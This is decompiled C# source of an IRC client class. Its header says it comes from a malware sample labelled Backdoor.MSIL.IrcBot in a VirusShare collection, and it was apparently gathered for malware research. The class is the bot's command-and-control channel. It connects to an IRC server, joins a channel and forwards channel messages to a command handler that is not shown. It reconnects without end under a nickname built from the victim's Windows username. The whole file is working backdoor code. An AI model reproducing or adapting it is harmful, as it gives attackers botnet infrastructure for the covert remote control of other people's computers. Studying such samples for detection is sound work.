// Decompiled with JetBrains decompiler
// Type: Irc9.IrcClient
// Assembly: Irc9, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E7A76116-F62B-4512-BE9B-418015CDF203
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.MSIL.IrcBot.ts-ca7c95003f1d98515fb57c5abb26f6ed9b53d83503d9e6f6d3082ef1428ffdee.exe

using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Irc9
{
  public class IrcClient
  {
    private IrcTcpClient _TcpClient;
    private NetworkStream networkStream;
    private StreamReader _Reader;
    private StreamWriter _Writer;
    private string[] _AddressList = new string[1]
    {
      "localhost"
    };
    private string _Nickname = "";
    private string _Chanel = "";
    private int _CurrentAddress = 0;
    private int _Port = 6667;
    private Encoding _Encoding = Encoding.GetEncoding("ISO-8859-1");
    private bool _IsConnected = false;
    private Thread socketListenThread;
    private string output;

    public event IrcClient.ReadLineEventHandler OnReadLine;

    public string Address => this._AddressList[this._CurrentAddress];

    public string[] AddressList => this._AddressList;

    public string Nickname => this._Nickname;

    public string Chanel => this._Chanel;

    public bool IsConnected => this._IsConnected;

    public Encoding Encoding
    {
      get => this._Encoding;
      set => this._Encoding = value;
    }

    public void Connect(string[] addresslist, int port, string nick, string channel)
    {
      this._AddressList = (string[]) addresslist.Clone();
      this._Nickname = nick;
      this._Chanel = channel;
      this._Port = port;
      try
      {
        IPAddress address = Dns.Resolve(this.Address).AddressList[0];
        this._TcpClient = new IrcTcpClient();
        this._TcpClient.NoDelay = true;
        this._TcpClient.ReceiveTimeout = 360000;
        this._TcpClient.SendTimeout = 360000;
        this._TcpClient.Connect(address, port);
        this._Reader = new StreamReader((Stream) this._TcpClient.GetStream(), this.Encoding);
        this._Writer = new StreamWriter((Stream) this._TcpClient.GetStream(), this.Encoding);
        this._IsConnected = true;
        this._Writer.AutoFlush = true;
        this.socketListenThread = new Thread(new ThreadStart(this.ReceiveIRCMessages));
        this.socketListenThread.Start();
        this._WriteLine("USER " + nick + " 8 * :" + nick);
        this._WriteLine("NICK " + nick);
        this._WriteLine("JOIN " + channel);
      }
      catch
      {
        if (this._Reader != null)
          this._Reader.Close();
        if (this._Writer != null)
          this._Writer.Close();
        if (this._TcpClient != null)
          this._TcpClient.Close();
        this._IsConnected = false;
        this.Reconnect(true);
      }
    }

    internal void ReceiveIRCMessages()
    {
      string nick = (string) null;
      string ident = (string) null;
      string host = (string) null;
      string channel = (string) null;
      string message = (string) null;
      try
      {
        do
        {
          this.output = this._Reader.ReadLine();
          this.output.Split(' ');
          this.ConsoleWriter(this.output);
          string str = this.output[0] != ':' ? this.output : this.output.Substring(1);
          string[] strArray = str.Split(' ');
          string from = strArray[0];
          string s = strArray[1];
          int length = from.IndexOf("!");
          int num1 = from.IndexOf("@");
          int num2 = str.IndexOf(" :");
          if (num2 != -1)
            ++num2;
          if (length != -1)
            nick = from.Substring(0, length);
          if (num1 != -1 && length != -1)
            ident = from.Substring(length + 1, num1 - length - 1);
          if (num1 != -1)
            host = from.Substring(num1 + 1);
          ReplyCode replycode;
          try
          {
            replycode = (ReplyCode) int.Parse(s);
          }
          catch (FormatException ex)
          {
            replycode = ReplyCode.Null;
          }
          if (num2 != -1)
            message = str.Substring(num2 + 1);
          if (channel != null && channel[0] == ':')
            channel = channel.Substring(1);
          IrcMessageData ircMessageData = new IrcMessageData(this, from, nick, ident, host, channel, message, this.output, replycode);
          switch (ircMessageData.RawMessageArray[0])
          {
            case "PING":
              this._Event_PING(ircMessageData);
              break;
          }
          switch (ircMessageData.RawMessageArray[1])
          {
            case "PRIVMSG":
              Function.IrcMessage(ircMessageData);
              break;
          }
        }
        while (this.output != null);
      }
      catch (Exception ex)
      {
        this.ConsoleWriter("*{0} - " + ex.Message + "\n");
        this._TcpClient.Close();
        this._Reader.Close();
        this._Writer.Close();
        this._IsConnected = false;
        this.Reconnect(true);
      }
    }

    public virtual void Reconnect(bool login)
    {
      Thread.Sleep(10000);
      int num = new Random().Next(1000, 10000);
      this.Connect(this._AddressList, this._Port, "{" + SystemInformation.UserName.ToString() + "}" + (object) num, this._Chanel);
    }

    private void _Event_PING(IrcMessageData ircdata) => this._WriteLine(Rfc2812.Pong(ircdata.RawMessageArray[1].Substring(1)));

    public void ConsoleWriter(string content) => Console.WriteLine(content + "\n");

    public bool _WriteLine(string data)
    {
      try
      {
        this._Writer.Write(data + "\r\n");
        this._Writer.Flush();
      }
      catch (IOException ex)
      {
        return false;
      }
      return false;
    }

    public void SendMessage(SendType type, string destination, string message) => this.SendMessage(type, destination, message, Priority.Medium);

    public void SendMessage(SendType type, string destination, string message, Priority priority)
    {
      switch (type)
      {
        case SendType.Message:
          this.RfcPrivmsg(destination, message, priority);
          break;
        case SendType.DCC:
          this.RfcPrivmsg(message);
          break;
      }
    }

    public void RfcPrivmsg(string destination, string message, Priority priority) => this._WriteLine(Rfc2812.Privmsg(destination, message));

    public void RfcPrivmsg(string message) => this._WriteLine(Rfc2812.Privmsg(message));

    public delegate void ReadLineEventHandler(object sender, ReadLineEventArgs e);
  }
}
